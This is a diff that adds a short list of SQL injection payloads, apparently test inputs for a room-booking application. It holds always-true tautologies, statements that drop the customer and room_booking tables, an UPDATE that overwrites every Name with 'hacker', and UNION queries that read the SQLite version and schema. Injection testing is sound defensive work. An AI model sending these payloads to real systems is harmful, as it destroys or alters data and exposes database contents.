@@ -1,0 +1,17 @@
+1 OR 1=1
+
+0 OR 1=1
+
+1; DROP TABLE customer;--
+
+12345 UNION SELECT NULL, sqlite_version(), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--
+
+9999; UPDATE room_booking SET Name='hacker' WHERE 1=1;--
+
+' OR '1'='1
+
+' OR 1=1 --
+
+'; DROP TABLE room_booking;--
+
+test' UNION SELECT name FROM sqlite_master WHERE type='table'--
